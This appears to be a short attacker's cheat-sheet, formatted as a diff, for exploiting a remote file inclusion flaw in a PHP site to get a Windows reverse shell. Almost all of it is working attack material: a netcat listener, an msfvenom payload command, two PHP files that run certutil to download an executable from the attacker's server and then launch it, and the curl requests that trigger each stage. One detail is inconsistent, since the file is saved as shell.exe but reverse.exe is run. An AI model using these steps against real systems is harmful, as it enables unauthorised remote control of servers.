@@ -1,1 +1,31 @@
+2-Step PhP Webshell
+Find a RFI vulnerability:
+sudo nc -nlvp 80
+curl http://192.168.79.x:4443/site/index.php?page=http://192.168.49.x/hi 
 
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.79 LPORT=4443 -f exe > reverse.exe ← Make a quick .exe reverse shell with msfvenom
+
+We also need to create two .php files. 
+We will name them “step1.php” and “step2.php”. 
+
+In step 1, we include PHP code to reach back to our HTTP server and download our reverse shell, reverse.exe.
+In step 2, we include PHP code to run the .exe from the box.
+
+step1.php
+<?php 
+$exec = system('certutil.exe -urlcache -split -f "http://192.168.49.x/reverse.exe" shell.exe', $val); 
+?> 
+
+step2.php
+<?php 
+$exec = system('reverse.exe', $val); 
+?> 
+
+Let’s start our HTTP server in the same location as where these PHP files are located. You will also need your .exe in the same place. Using curl, let’s ask the website to grab step1.php.
+curl http://192.168.79.x:4443/site/index.php?page=http://192.168.49.x/step1.php
+
+We can see it grab the file step1.php from our HTTP server. We know it has run successfully because it then also gets the reverse.exe file we specified in the contents of the step1.php file.
+Now we run curl again for step2.php, making sure our listener is running;
+
+curl http://192.168.79.x:4443/site/index.php?page=http://192.168.49.x/step2.php
+And we have our shell back 
